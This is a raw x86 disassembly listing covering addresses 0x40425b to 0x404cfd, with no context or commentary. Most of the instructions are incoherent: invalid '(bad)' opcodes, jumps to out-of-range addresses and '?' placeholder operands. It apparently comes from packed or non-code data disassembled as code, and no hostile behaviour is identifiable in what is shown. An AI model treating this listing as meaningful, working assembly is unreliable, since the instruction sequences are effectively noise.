  40425b:	xchg   DWORD PTR [esi],edi
  40425d:	pop    ebx
  40425e:	jmp    0x26cbbddd
  404263:	outs   dx,BYTE PTR ds:[esi]
  404264:	mov    dl,0x82
  404266:	jnp    0x40426c
  404268:	aas    
  404269:	pop    ebx
  40426a:	push   0xffffffbf
  40426c:	inc    edx
  40426d:	pop    eax
  40426e:	jmp    0x999b5076
  404273:	(bad)  
  404275:	pop    edx
  404276:	jmp    0x558097e
  40427b:	call   0x6841c993
  404280:	cmp    eax,0x8282e95c
  404285:	push   esi
  404286:	in     al,0x3
  404288:	ds imul ebp,ecx,0x53
  40428c:	push   esi
  40428d:	jmp    0xdc2c:0xe43e03e9
  404294:	in     al,0x5a
  404296:	mov    esi,0x71
	...
  4042bf:	add    BYTE PTR [eax],al
  4042c1:	add    BYTE PTR [edx-0x73],ah
  4042c4:	cmp    al,0xf0
  4042c6:	dec    ecx
  4042c7:	pop    es
  4042c8:	shl    edi,0xcb
  4042cb:	mov    dl,BYTE PTR [ecx-0x16a5c2a3]
  4042d1:	cmp    dl,0x67
  4042d4:	pusha  
  4042d5:	inc    ecx
  4042d6:	lea    edx,es:[eax+ebp*8]
  4042da:	push   ss
  4042db:	inc    ebp
  4042dc:	xchg   edx,eax
  4042dd:	add    al,0x3e
  4042df:	mov    esp,?
  4042e1:	sti    
  4042e2:	sbb    esi,eax
  4042e4:	add    BYTE PTR [ebx+0x21],dh
  4042e7:	lea    ebp,[edx-0x1f]
  4042ea:	arpl   WORD PTR gs:[eax-0x58],cx
  4042ee:	cmp    eax,0x15f1758c
  4042f3:	pop    eax
  4042f4:	std    
  4042f5:	push   esi
  4042f6:	loope  0x404358
  4042f8:	fmul   DWORD PTR [esi+0x6f]
  4042fb:	xchg   edi,edi
  4042fd:	mov    esp,0x3de274d5
  404302:	(bad)  [ebx+eiz*1-0x7f91eef]
  404309:	cs dec edi
  40430b:	cmp    edi,0xffffff9c
  40430e:	mov    ch,0x74
  404310:	or     BYTE PTR [ecx+ebx*4],bl
  404313:	mov    WORD PTR [ebx],fs
  404315:	xor    DWORD PTR [ecx+0x3101ec06],esp
  40431b:	pop    ebx
  40431c:	add    cl,ch
  40431e:	mov    al,ds:0x8911e806
  404323:	mov    edi,?
  404325:	jmp    0x40432a
	...
  40434e:	add    BYTE PTR [eax],al
  404350:	mov    al,ds:0x8b010806
  404355:	xchg   edx,eax
  404356:	jmp    esi
  404358:	hlt    
  404359:	xchg   edi,eax
  40435a:	pop    ebx
  40435b:	mov    al,0x7f
  40435d:	push   edi
  40435e:	add    BYTE PTR [eiz*8+0x624c837e],bh
  404365:	mov    WORD PTR [ebx-0xf],?
  404368:	pusha  
  404369:	push   es
  40436a:	or     cl,dl
  40436c:	add    BYTE PTR [ecx-0x64db1700],0xc9
  404373:	stos   DWORD PTR es:[edi],eax
  404374:	inc    ecx
  404375:	mov    WORD PTR [edx+esi*2+0x11],ss
  404379:	loopne 0x4043c0
  40437b:	icebp  
  40437c:	fild   DWORD PTR ds:[eax]
  40437f:	jmp    0x29aa6ec1
  404384:	add    dl,BYTE PTR [edi+0x582700ea]
  40438a:	leave  
  40438b:	ret    0x581b
  40438e:	push   ebp
  40438f:	mov    eax,ebx
  404391:	sbb    al,0xfc
  404393:	mov    edx,DWORD PTR [edx]
  404395:	nop
  404396:	mov    cl,BYTE PTR [ebp-0xd]
  404399:	js     0x4043a9
  40439b:	push   ecx
  40439c:	es scas eax,DWORD PTR es:[edi]
  40439e:	add    ch,BYTE PTR [ebx]
  4043a0:	pop    ss
  4043a1:	mov    DWORD PTR [ebx+0x3775459],ebp
  4043a7:	rep lods eax,DWORD PTR ds:[esi]
  4043a9:	adc    al,0xc9
  4043ab:	ret    0x57cf
  4043ae:	push   ebp
  4043af:	mov    eax,DWORD PTR [ebx+0x8b571e]
	...
  4043dd:	add    BYTE PTR [edx-0x2574047d],dl
  4043e3:	(bad)
  4043e7:	js     0x4043eb
  4043e9:	repz sti 
  4043eb:	adc    al,0x5e
  4043ed:	leave  
  4043ee:	push   ebp
  4043ef:	test   bh,bh
  4043f1:	push   esp
  4043f2:	or     al,0xa4
  4043f4:	push   esi
  4043f5:	push   edi
  4043f6:	or     al,0xb
  4043f8:	or     ah,bh
  4043fa:	sbb    al,0x53
  4043fc:	adc    BYTE PTR [ebx],ch
  4043fe:	push   edi
  4043ff:	adc    DWORD PTR [ebp+0xc],edi
  404402:	test   BYTE PTR [eax-0xd],bl
  404405:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404406:	ins    BYTE PTR es:[edi],dx
  404407:	shl    BYTE PTR [ebp+0x1],1
  40440a:	pop    ss
  40440b:	push   ss
  40440c:	pop    esi
  40440d:	leave  
  40440e:	xchg   ebp,eax
  40440f:	xchg   edx,eax
  404410:	call   DWORD PTR [esp+ecx*8-0x4e]
  404414:	add    esp,0xffffff93
  404417:	sbb    al,0x57
  404419:	push   ebx
  40441a:	call   FWORD PTR [eax+0x1]
  40441d:	add    BYTE PTR [edi+0x76],dl
  404420:	jne    0x40442a
  404422:	iret   
  404423:	out    dx,al
  404424:	(bad)  
  404425:	call   eax
  404427:	add    al,0x7d
  404429:	or     BYTE PTR [esi],bh
  40442b:	cmp    DWORD PTR ds:0x42c0c2b,edi
  404431:	add    DWORD PTR [esi],edi
  404433:	je     0x4044b0
  404435:	adc    al,0x54
  404437:	or     al,dl
  404439:	loop   0x404442
  40443b:	(bad)  
  40443c:	data16 or BYTE PTR [ecx+0x41],bh
  404440:	jns    0x4044b7
	...
  40446a:	add    BYTE PTR [eax],al
  40446c:	dec    edx
  40446d:	cmp    bh,BYTE PTR [edi]
  40446f:	(bad)  
  404470:	ds ins DWORD PTR es:[edi],dx
  404472:	mov    ebx,0xffff052b
  404477:	cmp    dh,BYTE PTR [esi-0x7cff1b41]
  40447d:	and    bh,BYTE PTR [edx+0x4]
  404480:	pcmpeqb mm7,QWORD PTR [esi]
  404483:	(bad)  
  404484:	cmp    DWORD PTR [edx],ecx
  404486:	dec    edi
  404487:	(bad)  
  404488:	mov    ah,0x80
  40448a:	sub    DWORD PTR [eax+0x45797d42],ecx
  404490:	mov    cl,0xc
  404492:	add    BYTE PTR [edx],bh
  404494:	jmp    FWORD PTR [esi+esi*1+0x18762c10]
  40449b:	leave  
  40449c:	cwde   
  40449d:	xor    eax,0xe8f5d56f
  4044a2:	inc    ebp
  4044a3:	leave  
  4044a4:	jl     0x404426
  4044a6:	add    edx,DWORD PTR [ebp-0x4b]
  4044a9:	mov    BYTE PTR [eax+0x4e4576c4],al
  4044af:	push   edi
  4044b0:	jno    0x4044e1
  4044b2:	cld    
  4044b3:	pop    edx
  4044b4:	mov    ah,0x75
  4044b6:	jnp    0x4044fd
  4044b8:	arpl   si,di
  4044ba:	aas    
  4044bb:	add    esi,eax
  4044bd:	aaa    
  4044be:	call   0x3d819a4e
  4044c3:	mov    edx,ebx
  4044c5:	jg     0x404483
  4044c7:	inc    ebp
  4044c8:	inc    esi
  4044c9:	je     0x4044ce
  4044cb:	add    BYTE PTR [esi],bh
  4044cd:	pop    ebx
  4044ce:	jb     0x404506
	...
  4044f8:	add    BYTE PTR [eax],al
  4044fa:	dec    esi
  4044fb:	jle    0x404526
  4044fd:	out    0x83,al
  4044ff:	mov    dh,ah
  404501:	lods   eax,DWORD PTR ds:[esi]
  404502:	jnp    0x40448c
  404504:	fisubr WORD PTR [ebp+0x4e714332]
  40450a:	adc    DWORD PTR [ebx+0x14],ebx
  40450d:	call   0xe86d164b
  404512:	mov    ah,0x6e
  404514:	mov    cl,0x7b
  404516:	xchg   ebx,eax
  404517:	mov    esi,esi
  404519:	lods   eax,DWORD PTR ds:[esi]
  40451a:	jnp    0x4044a4
  40451c:	jno    0x40452d
  40451e:	es pop edx
  404520:	lahf   
  404521:	ds loop 0x4044f8
  404524:	mov    ah,0xe4
  404526:	(bad)  
  404527:	outs   dx,BYTE PTR ds:[esi]
  404528:	add    DWORD PTR [edx+0x6b],edi
  40452b:	mov    ch,bl
  40452d:	dec    esi
  40452e:	enter  0xddd4,0x29
  404532:	mov    ch,0x1f
  404534:	xor    DWORD PTR [ebx],esi
  404536:	push   edx
  404537:	dec    ebx
  404538:	es ds mov dh,0x7c
  40453c:	sub    DWORD PTR [ecx+0x3],edi
  40453f:	mov    BYTE PTR [ecx+0x0],ah
  404542:	mov    ah,0x1f
  404544:	or     eax,0xa65bfd7b
  404549:	inc    ebp
  40454a:	cmc    
  40454b:	xchg   ebx,eax
  40454c:	sub    esi,edi
  40454e:	mov    DWORD PTR [esi],ebp
  404550:	(bad)  
  404551:	xlat   BYTE PTR ds:[ebx]
  404552:	mov    edi,0x79e4fd9e
  404557:	mov    DWORD PTR [edx],edi
  404559:	das    
  40455a:	xchg   ebp,eax
  40455b:	xlat   BYTE PTR ds:[ebx]
  40455c:	and    al,0xe0
	...
  404586:	add    BYTE PTR [eax],al
  404588:	push   cs
  404589:	mov    bl,BYTE PTR [esp+ecx*1+0x56]
  40458d:	movnti DWORD PTR [esi+edi*1],eax
  404591:	loopne 0x40453c
  404593:	adc    eax,esi
  404595:	lock jmp 0xca839e
  40459b:	cmp    al,0x32
  40459d:	jae    0x4045e4
  40459f:	mov    bh,0x1d
  4045a1:	mov    DWORD PTR [ecx+0x7589162c],ecx
  4045a7:	popf   
  4045a8:	sbb    al,BYTE PTR [esi-0x17]
  4045ab:	jmp    0x160099ed
  4045b0:	popf   
  4045b1:	rol    BYTE PTR [ebp+0x79],cl
  4045b4:	sbb    eax,0x9491f40f
  4045b9:	mov    edi,edi
  4045bb:	jbe    0x404570
  4045bd:	push   ds
  4045be:	clc    
  4045bf:	outs   dx,BYTE PTR ds:[esi]
  4045c0:	xchg   edi,eax
  4045c1:	(bad)  
  4045c2:	(bad)  
  4045c3:	fcom   QWORD PTR ds:0xda597589
  4045c9:	xlat   BYTE PTR ds:[ebx]
  4045ca:	(bad)  
  4045cb:	push   esi
  4045cc:	fisttp QWORD PTR [eax+0x63ea4d75]
  4045d2:	jmp    0x75c883c0
  4045d7:	in     eax,dx
  4045d8:	aad    0x5f
  4045da:	jmp    0xff6b83c8
  4045df:	mov    ah,0x49
  4045e1:	(bad)  
  4045e2:	test   DWORD PTR [edi],edx
  4045e4:	pushf  
  4045e5:	mov    bh,bh
  4045e7:	mov    ecx,0x16febe95
	...
  404614:	add    BYTE PTR [eax],al
  404616:	popf   
  404617:	mov    BYTE PTR [ebp+0x15],dh
  40461a:	popf   
  40461b:	push   cs
  40461c:	clc    
  40461d:	je     0x4045e6
  40461f:	jns    0x40461f
  404621:	(bad)  
  404622:	pushf  
  404623:	sub    ebp,eax
  404625:	neg    DWORD PTR [edi+0x16eeff88]
  40462b:	push   ebx
  40462c:	call   0xffc8d885
  404631:	push   ebx
  404632:	cmp    dh,bl
  404634:	adc    ah,BYTE PTR [ecx]
  404636:	sti    
  404637:	pop    edx
  404638:	call   DWORD PTR [edx+ecx*2+0x73]
  40463c:	mov    ebx,0xff7d7d00
  404641:	or     ebx,DWORD PTR [edi-0x770b8a83]
  404647:	and    edi,eax
  404649:	push   DWORD PTR [edx+0x57]
  40464c:	call   0xffbd23fc
  404651:	and    edi,edi
  404653:	jl     0x4046ca
  404655:	clc    
  404656:	mov    edi,0xc8fffdc8
  40465b:	jl     0x4046d2
  40465d:	or     BYTE PTR [edi-0x77000846],ch
  404663:	fld    st(3)
  404665:	pop    ebx
  404666:	ficomp WORD PTR [ebp-0x27adfff8]
  40466c:	in     al,dx
  40466d:	and    DWORD PTR [ebx],0xffffffb0
  404670:	push   edi
  404671:	mov    esp,DWORD PTR [edx+0x3c00a8f]
  404677:	push   edx
  404678:	mov    DWORD PTR [eax],0x0
	...
  4046a2:	add    BYTE PTR [eax],al
  4046a4:	out    0x5b,eax
  4046a6:	add    BYTE PTR [eax],al
  4046a8:	sub    al,0x7c
  4046aa:	cmp    DWORD PTR [ebp-0x21],0x5e
  4046ae:	jne    0x4046b7
  4046b0:	dec    ebp
  4046b1:	pop    esp
  4046b2:	add    al,BYTE PTR [eax]
  4046b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4046b5:	js     0x4046c6
  4046b7:	sbb    edx,0xffffff83
  4046ba:	add    DWORD PTR [ebp-0x60],esi
  4046bd:	in     eax,0x0
  4046bf:	add    DWORD PTR [edi+0x7c02eb5b],edx
  4046c5:	int    0x81
  4046c7:	retf   0x5b9e
  4046ca:	add    al,BYTE PTR [eax]
  4046cc:	sbb    dl,BYTE PTR [ebx]
  4046ce:	cld    
  4046cf:	push   eax
  4046d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4046d1:	cmc    
  4046d2:	(bad)  
  4046d3:	(bad)  
  4046d4:	repnz push edi
  4046d6:	push   DWORD PTR [ebp+0x6f]
  4046d9:	jae    0x40467d
  4046db:	jmp    0xc04ba237
  4046e0:	ds daa 
  4046e2:	jno    0x404671
  4046e4:	add    ebp,DWORD PTR [edx+0xf3e6a34]
  4046ea:	inc    edi
  4046eb:	hlt    
  4046ec:	out    dx,al
  4046ed:	sub    eax,DWORD PTR [edi+edi*8]
  4046f0:	retf   
  4046f1:	mov    eax,ds:0x9d3a75e0
  4046f6:	(bad)
  4046fa:	or     al,0xc0
  4046fc:	mov    bl,0x38
  4046fe:	test   DWORD PTR [ebp+0x26],edi
  404701:	jne    0x40475a
  404703:	inc    esi
  404704:	mov    ebp,0x1d857
	...
  404731:	add    BYTE PTR [ebx+0x67d8476],cl
  404737:	je     0x404790
  404739:	cmp    dh,BYTE PTR [ebp-0x71bf23c9]
  40473f:	fadd   QWORD PTR [edx-0x3]
  404742:	icebp  
  404743:	std    
  404744:	mov    eax,?
  404746:	mov    ebx,0x8950dbbf
  40474b:	call   0x1057:0x153e6a03
  404752:	rol    edi,1
  404754:	fucomip st,st(0)
  404756:	jno    0x404783
  404758:	add    al,0x0
  40475a:	xor    eax,0x110a5834
  40475f:	sbb    al,0x29
  404761:	std    
  404762:	mov    cl,0x3d
  404764:	sub    eax,0x8c7895ff
  404769:	inc    ebp
  40476a:	dec    edx
  40476b:	jns    0x404730
  40476d:	je     0x4047b2
  40476f:	push   ebp
  404770:	push   edi
  404771:	clc    
  404772:	shl    DWORD PTR [eax+eiz*8+0x75],0x8a
  404777:	ins    BYTE PTR es:[edi],dx
  404778:	sbb    eax,0x8c743ee9
  40477d:	mov    DWORD PTR [ebp+0x34],0x5bbd1c57
  404784:	fs cld 
  404786:	aas    
  404787:	or     dh,bh
  404789:	mov    ebx,?
  40478b:	bound  ebp,QWORD PTR [ecx]
  40478d:	xor    al,0x59
  40478f:	adc    ch,dh
  404791:	loopne 0x40475e
  404793:	push   0xffffffc6
  404795:	push   esi
	...
  4047be:	add    BYTE PTR [eax],al
  4047c0:	cmp    al,BYTE PTR [esi+0x3c560c34]
  4047c6:	mov    dh,0xe0
  4047c8:	cmp    DWORD PTR [esi],esp
  4047ca:	mov    al,ds:0x3c5b4ac5
  4047cf:	lea    ebx,[edx]
  4047d1:	fcomp  QWORD PTR [esp+ecx*1]
  4047d4:	aas    
  4047d5:	pop    ebx
  4047d6:	jmp    0x8e94db5e
  4047db:	push   ss
  4047dc:	in     al,0x12
  4047de:	sub    BYTE PTR [ecx+edi*4],al
  4047e1:	pop    ds
  4047e2:	icebp  
  4047e3:	ins    DWORD PTR es:[edi],dx
  4047e4:	ds xchg ah,bh
  4047e7:	idiv   eax
  4047e9:	psubusw mm4,mm0
  4047ec:	imul   edx,DWORD PTR [edi+0x66],0x56
  4047f0:	ss jae 0x404848
  4047f3:	loope  0x4047d6
  4047f5:	test   DWORD PTR [eax],esp
  4047f7:	lds    ebp,FWORD PTR [esi]
  4047f9:	pop    ebx
  4047fa:	add    al,ah
  4047fc:	lds    ebp,FWORD PTR [edx+0x5387e518]
  404802:	jmp    0x43ec860a
  404807:	push   esp
  404808:	dec    edx
  404809:	fdivr  QWORD PTR [ebx]
  40480b:	adc    cl,ah
  40480d:	mov    bl,0x25
  40480f:	sub    BYTE PTR [ebx+ebp*2+0x794ef2f8],0x7
  404817:	mov    dh,BYTE PTR [edx]
  404819:	loopne 0x404814
  40481b:	mov    bh,bh
  40481d:	pop    edx
  40481e:	pop    es
  40481f:	ret    
  404820:	adc    esp,DWORD PTR [ecx+0x362a]
	...
  40484e:	mov    ch,0x76
  404850:	add    BYTE PTR [esi-0x9f7e036],bl
  404856:	lods   al,BYTE PTR ds:[esi]
  404857:	sar    DWORD PTR [ebp-0xb],1
  40485a:	mov    ah,0x17
  40485c:	adc    dl,dh
  40485e:	jb     0x40486e
  404860:	sbb    BYTE PTR [edx-0x6e],ah
  404863:	fwait
  404864:	jmp    0x42c6:0x255e2fe1
  40486b:	pop    ebx
  40486c:	add    BYTE PTR [edx+0x36],dh
  40486f:	loopne 0x404881
  404871:	pusha  
  404872:	sbb    DWORD PTR [ebx+0x33],0xffffffab
  404876:	jns    0x4048f1
  404878:	call   0xc9653b1b
  40487d:	stos   DWORD PTR es:[edi],eax
  40487e:	dec    esi
  40487f:	pop    ebx
  404880:	push   ebp
  404881:	bound  ecx,QWORD PTR [esi]
  404883:	sub    DWORD PTR [ebx+0x755b420c],eax
  404889:	out    dx,al
  40488a:	add    BYTE PTR [edi],bl
  40488c:	or     BYTE PTR [ecx+0x72],dh
  40488f:	sbb    al,BYTE PTR [eax]
  404891:	push   0x5f
  404893:	push   edi
  404894:	add    ah,dh
  404896:	cmp    BYTE PTR [ebp+eax*2+0x4113b5f5],bl
  40489d:	jmp    0x414857a2
  4048a2:	sar    DWORD PTR [ebp+0x0],cl
  4048a5:	jmp    0xbd3fec6e
  4048aa:	cmp    DWORD PTR [ebx+0x7],esi
  4048ad:	inc    esi
  4048ae:	cmp    bl,BYTE PTR [ebx+0x3]
  4048b1:	adc    DWORD PTR [eax],eax
	...
  4048db:	add    ch,bh
  4048dd:	daa    
  4048de:	call   0xffc4dad1
  4048e3:	jb     0x4048cf
  4048e5:	test   BYTE PTR [ebp-0xf],dh
  4048e8:	ins    BYTE PTR es:[edi],dx
  4048e9:	jae    0x4048fc
  4048eb:	push   cs
  4048ec:	inc    edx
  4048ed:	pop    ebx
  4048ee:	call   DWORD PTR [ecx+eax*2-0x6eff17d8]
  4048f5:	jge    0x4048f7
  4048f7:	add    BYTE PTR [eax+ebx*4],cl
  4048fa:	pop    ebx
  4048fb:	leave  
  4048fc:	and    eax,0xdc550057
  404901:	mov    dl,BYTE PTR [ebx-0x7d]
  404904:	loop   0x40495c
  404906:	add    BYTE PTR [ebp+0x58],dh
  404909:	popf   
  40490a:	inc    ebp
  40490b:	or     bh,bl
  40490d:	cmovno eax,DWORD PTR [eax]
  404910:	in     al,0xfa
  404912:	or     eax,DWORD PTR [eax]
  404914:	or     bl,BYTE PTR [edi+eax*8+0x45]
  404918:	push   ebx
  404919:	ror    BYTE PTR [eax+0x41],1
  40491c:	daa    
  40491d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40491e:	jne    0x404928
  404920:	(bad)  
  404921:	mov    edx,0xd11700e6
  404926:	fdivr  st,st(7)
  404928:	dec    edx
  404929:	imul   ebp,eax,0xffffffb3
  40492c:	leave  
  40492d:	push   edi
  40492e:	add    BYTE PTR [ebx],al
  404930:	iret   
  404931:	sbb    BYTE PTR [ebx-0x18],dl
  404934:	lods   al,BYTE PTR ds:[esi]
  404935:	mov    al,ds:0xc08cffff
  40493a:	push   DWORD PTR [ebp-0x21]
  40493d:	dec    eax
  40493e:	call   0x404a00
	...
  404967:	add    BYTE PTR [eax],al
  404969:	add    BYTE PTR [ecx+0xaff0057],bh
  40496f:	push   esp
  404970:	push   ebx
  404971:	call   0x40c713
  404976:	data16 sti 
  404978:	pop    es
  404979:	mov    BYTE PTR [edi-0x308bffe2],bl
  40497f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404980:	jne    0x40498a
  404982:	outs   dx,DWORD PTR ds:[esi]
  404983:	mov    ch,0xfb
  404985:	push   DWORD PTR [eax-0x2f]
  404988:	ret    
  404989:	pop    ebx
  40498a:	pop    esi
  40498b:	call   0x83ec:0xd0ea0008
  404992:	pop    ebx
  404993:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404994:	push   edi
  404995:	push   0x4773e
  40499a:	ds pop edx
  40499c:	lods   eax,DWORD PTR ds:[esi]
  40499d:	sti    
  40499e:	mov    DWORD PTR [esp+ecx*4+0x45],ebx
  4049a2:	xor    al,0x1f
  4049a5:	mov    esi,0x3b305
  4049aa:	jmp    0x404a1b
  4049ac:	jmp    0x3e6a:0xe0266916
  4049b3:	sub    BYTE PTR [edi+edi*8],al
  4049b6:	sar    DWORD PTR [ecx+0x69],cl
  4049b9:	add    BYTE PTR [ecx-0x72],dl
  4049bc:	popf   
  4049bd:	dec    ebx
  4049be:	push   DWORD PTR [ecx-0x7a]
  4049c1:	rol    bh,0x49
  4049c4:	fnsave [ebp+0x3a]
  4049c7:	popf   
  4049c8:	imul   edi,ebx,0x45c5b231
	...
  4049f6:	add    BYTE PTR [eax],al
  4049f8:	sub    dh,BYTE PTR [ebp+0x3]
  4049fb:	add    BYTE PTR [esi],bh
  4049fd:	and    edx,eax
  4049ff:	dec    ebx
  404a00:	jg     0x404a76
  404a02:	call   0x88ca0f34
  404a07:	inc    ebp
  404a08:	ss (bad) 
  404a0a:	fdivr  QWORD PTR [edi+0x1]
  404a0d:	add    bl,BYTE PTR [ebx]
  404a0f:	inc    edx
  404a10:	inc    edx
  404a11:	jg     0x404a0b
  404a13:	imul   edi,DWORD PTR [esi],0x8e08421f
  404a19:	lods   al,BYTE PTR ds:[esi]
  404a1a:	or     eax,0xdc747f4d
  404a1f:	xor    ah,dh
  404a21:	rcr    ch,0xff
  404a24:	sar    DWORD PTR [ebp-0x3d],1
  404a27:	je     0x404a6c
  404a29:	or     eax,DWORD PTR [edi-0x4]
  404a2c:	aad    0x8c
  404a2e:	add    bh,0x42
  404a31:	cmc    
  404a32:	sbb    al,0x0
  404a34:	sub    esp,DWORD PTR [edx-0x77]
  404a37:	inc    ebp
  404a38:	stos   BYTE PTR es:[edi],al
  404a39:	pop    ebx
  404a3a:	(bad)  
  404a3b:	retf   0x577c
  404a3e:	jmp    0xbab00f79
  404a43:	mov    bl,bh
  404a45:	push   edx
  404a46:	loop   0x404a0b
  404a48:	adc    bl,BYTE PTR [eax+0x69]
  404a4b:	sbb    al,0x3e
  404a4d:	or     bl,dh
  404a4f:	fwait
  404a50:	ds pop ebx
  404a52:	jmp    0x2bd45f5a
  404a57:	or     BYTE PTR [esi],bh
  404a59:	cmc    
  404a5a:	call   0x404ac8
	...
  404a83:	add    BYTE PTR [eax],al
  404a85:	add    BYTE PTR [esi],bh
  404a87:	cmc    
  404a88:	jmp    0xe93588f6
  404a8d:	imul   edi,DWORD PTR [esi+0x4903e95b],0x8
  404a94:	icebp  
  404a95:	jmp    0x404a25
  404a97:	js     0x404a82
  404a99:	add    eax,ebp
  404a9b:	mov    ds:0x77dc402,al
  404aa0:	loop   0x404ad2
  404aa2:	push   ss
  404aa3:	mov    dl,0x8c
  404aa5:	add    edi,DWORD PTR [esi]
  404aa7:	ret    
  404aa8:	call   0x329b88b0
  404aad:	retf   
  404aae:	cld    
  404aaf:	push   esi
  404ab0:	jmp    0x72aeffeb
  404ab5:	inc    esi
  404ab6:	ss push esi
  404ab8:	test   eax,0xb1db4357
  404abd:	add    ebp,DWORD PTR [ebx+0x54]
  404ac0:	xor    DWORD PTR [ebx],eax
  404ac2:	ds pop ebx
  404ac4:	jmp    0xe9974793
  404ac9:	fcom   QWORD PTR [ebx+0x53]
  404acc:	inc    ecx
  404acd:	cwde   
  404ace:	fistp  DWORD PTR [edx-0x17]
  404ad1:	add    dh,0x81
  404ad4:	mov    ebp,0xe96a970e
  404ad9:	add    edi,DWORD PTR [esi]
  404adb:	push   edx
  404adc:	add    BYTE PTR [ebp+edi*2+0x51],bl
  404ae0:	mov    dh,0x29
  404ae2:	xchg   esi,eax
  404ae3:	push   edi
  404ae4:	mov    eax,0x5b3de9
  404ae9:	xor    BYTE PTR [eax],al
	...
  404b13:	add    BYTE PTR [edi+0x56],bh
  404b16:	add    BYTE PTR [esi+eax*8+0x6925836e],bh
  404b1d:	hlt    
  404b1e:	call   DWORD PTR [edx-0xe8a7dc3]
  404b24:	gs out 0xe5,al
  404b27:	jmp    0x7600a169
  404b2c:	pop    ss
  404b2d:	sub    edx,DWORD PTR [eax-0x2f]
  404b30:	loopne 0x404ab6
  404b32:	(bad)  
  404b33:	fmulp  st(3),st
  404b35:	pop    ss
  404b36:	cld    
  404b37:	xor    DWORD PTR [edx],ecx
  404b39:	xor    BYTE PTR [ebp-0x33],0x65
  404b3d:	pop    es
  404b3e:	or     cl,dl
  404b40:	jecxz  0x404bb9
  404b42:	add    cl,ch
  404b44:	dec    eax
  404b45:	fwait
  404b46:	jne    0x404b2d
  404b48:	adc    al,0x7
  404b4a:	cld    
  404b4b:	rcr    DWORD PTR [ebp+0x51a6ff85],0x9b
  404b52:	jmp    0x404b3e
  404b54:	enter  0xfc16,0xa0
  404b58:	clc    
  404b59:	push   edi
  404b5a:	add    BYTE PTR [ecx+edi*4],dh
  404b5d:	outs   dx,DWORD PTR ds:[esi]
  404b5e:	push   ebx
  404b5f:	jb     0x404ba8
  404b61:	dec    edi
  404b62:	push   0xffffffd9
  404b64:	xor    BYTE PTR [ebx+0x7b],dh
  404b67:	jae    0x404b7e
  404b69:	sub    DWORD PTR [edx-0x17],0xea6a5b5b
  404b70:	push   ebx
  404b71:	pop    ebx
  404b72:	push   0xffffffea
  404b74:	gs pop ebx
  404b76:	add    cl,ch
	...
  404ba0:	add    BYTE PTR [eax],al
  404ba2:	mov    ebp,0xd5e17580
  404ba7:	xchg   esp,esp
  404ba9:	add    bh,dl
  404bab:	pop    esp
  404bac:	mov    DWORD PTR [ebx],eax
  404bae:	out    0x10,eax
  404bb0:	pop    esp
  404bb1:	push   0xffffffa7
  404bb3:	dec    esp
  404bb4:	call   0x974dee
  404bb9:	mov    esp,edx
  404bbb:	pop    eax
  404bbc:	push   0x0
  404bbe:	lods   eax,DWORD PTR ds:[esi]
  404bbf:	pop    esp
  404bc0:	push   0x0
  404bc2:	mov    ebp,0x38006a56
  404bc7:	push   0x573227e8
  404bcc:	add    BYTE PTR [ebx],cl
  404bce:	daa    
  404bcf:	sub    ebp,DWORD PTR [edi]
  404bd1:	mov    DWORD PTR [eax+eax*4+0x5cbd0069],esp
  404bd8:	push   0x0
  404bda:	or     eax,0x3fe8505b
  404bdf:	jp     0x404be1
  404be1:	add    dh,bl
  404be3:	sbb    BYTE PTR [eax],cl
  404be5:	or     edx,DWORD PTR [edi+0x4ff242b]
  404beb:	pop    ebx
  404bec:	call   0x9c4fac
  404bf1:	push   DWORD PTR [esp+esi*2]
  404bf4:	mov    ah,0xe4
  404bf6:	pop    ss
  404bf7:	pop    esp
  404bf8:	mov    DWORD PTR [ebx],0xffffa4d8
  404bfe:	lods   al,BYTE PTR ds:[esi]
  404bff:	push   edx
  404c00:	push   DWORD PTR [ebx]
  404c02:	mov    edi,0xe4ba
	...
  404c2f:	add    BYTE PTR [edi],dl
  404c31:	popf   
  404c32:	add    edi,edi
  404c34:	mov    eax,0xa72bffa4
  404c39:	pop    esi
  404c3a:	inc    ebx
  404c3b:	or     al,bl
  404c3d:	or     al,al
  404c3f:	pop    ebx
  404c40:	sahf   
  404c41:	xchg   ebp,eax
  404c42:	or     BYTE PTR [eax],al
  404c44:	mov    ds:0x4c53ecd0,al
  404c49:	inc    ebx
  404c4a:	or     BYTE PTR [ebx+0x74db6d3e],al
  404c50:	xor    DWORD PTR [ecx],edx
  404c52:	push   esi
  404c53:	or     dh,dl
  404c55:	arpl   di,bx
  404c57:	add    BYTE PTR [esi],bh
  404c59:	inc    ecx
  404c5a:	push   esi
  404c5b:	add    al,0xa6
  404c5d:	mov    edi,0x313e00df
  404c62:	push   ss
  404c63:	call   0x439a79
  404c68:	cmc    
  404c69:	dec    edx
  404c6a:	lds    eax,FWORD PTR [esi+edi*1]
  404c6d:	mov    edi,0x35bfec8e
  404c72:	jecxz  0x404c63
  404c74:	sbb    DWORD PTR [eax+0x31],0x29bebd57
  404c7b:	dec    eax
  404c7c:	push   DWORD PTR [ecx+0x3]
  404c7f:	je     0x404cd4
  404c81:	jno    0x404c92
  404c83:	div    BYTE PTR cs:[edx]
  404c86:	add    al,0xe8
  404c88:	mov    edi,0x79ffd97a
  404c8d:	outs   dx,BYTE PTR ds:[esi]
  404c8e:	sub    DWORD PTR [eax-0x1],ecx
  404c91:	jno    0x404c96
	...
  404cbb:	add    BYTE PTR [eax],al
  404cbd:	add    BYTE PTR [esi],bh
  404cbf:	jb     0x404c45
  404cc1:	cmp    eax,0x434c6c
  404cc6:	ds inc eax
  404cc8:	out    dx,eax
  404cc9:	(bad)  
  404cca:	jae    0x404c4e
  404ccc:	dec    ebx
  404ccd:	inc    ecx
  404cce:	ds in  al,dx
  404cd0:	gs stc 
  404cd2:	sbb    esi,ebx
  404cd4:	rol    DWORD PTR ds:0x433c4c,0x3e
  404cdb:	je     0x404ce0
  404cdd:	add    BYTE PTR [ebx-0x6102c11],dh
  404ce3:	std    
  404ce4:	xor    ebp,eax
  404ce6:	mov    ds:0xbbffd904,eax
  404ceb:	mul    edi
  404ced:	out    dx,eax
  404cee:	loope  0x404d4b
  404cf0:	data16 xor al,0xe6
  404cf3:	mov    esp,0xd0d1d959
  404cf8:	lods   al,BYTE PTR ds:[esi]
  404cf9:	xlat   BYTE PTR ds:[ebx]
  404cfa:	outs   dx,BYTE PTR ds:[esi]
  404cfb:	repz push ss
  404cfd:	dec    esp
